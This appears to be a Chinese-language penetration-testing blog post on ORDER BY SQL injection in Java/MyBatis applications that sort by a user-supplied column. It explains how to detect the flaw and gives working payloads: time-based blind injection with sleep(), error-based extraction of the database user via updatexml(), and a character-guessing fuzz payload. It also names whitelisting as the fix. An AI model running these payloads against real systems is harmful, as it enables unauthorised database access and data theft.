---
layout: post
title: Order by Injection Exploit Summary
categories: [Pen-test]
Description: Order by 注入总结
keywords: SQL
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---



Description: Order by injection exploit summary.

## 判断order by注入

当你看到一个查询结果有排序小箭头时，要额外注意，这可能一个SORT(排序)键值，抓包后可能是这样的。
    
![](/images/orderbysql/1.png)

后端SQL语句就差不多类似
        
```shell

select * from table where id =1 order by zzf desc;

```

这种地方在java-mybatis环境中容易引发注入问题，原因很简单，在mybatis中order by ${sort}传的是列名不能用#{}，因此需要额外用白名单处理。有的开发没处理就有注入了。

如何判断这里有order by注入呢？很简单，原理跟最基础的联合注入利用order by爆破字段数量是一样的。
order by (1)  不报错
order by (10000000) 报错
    
这样就基本能判断出来这里有order by注入了。
当然也可以直接order by sleep(1)。
    
## order by注入利用
    
### 时间盲注
    
能用sleep(1)就能构造最简单的基于时间延迟的布尔盲注。

select * from test_table order by if(1=1,sleep(1),1);
    
![](/images/orderbysql/swappy-20241204-164412.png)
    
> 但它有个很大的缺点，就是有几条数据就重复几次sleep(1)。
    
### 报错注入
    
经典的updatexml()
    
```shell

select * from test_table  order by updatexml(1,concat(0x7e,(select user()),0x7e),1);

```
    
![](/images/orderbysql/swappy-20241204-164602.png)
    
## FUZZ
    
```shell

(case when substr(CURRENT_USER,1,1)='r' then rand(exp(99999999)) else 1 end)

```
    
![](/images/orderbysql/swappy-20241204-164812.png)

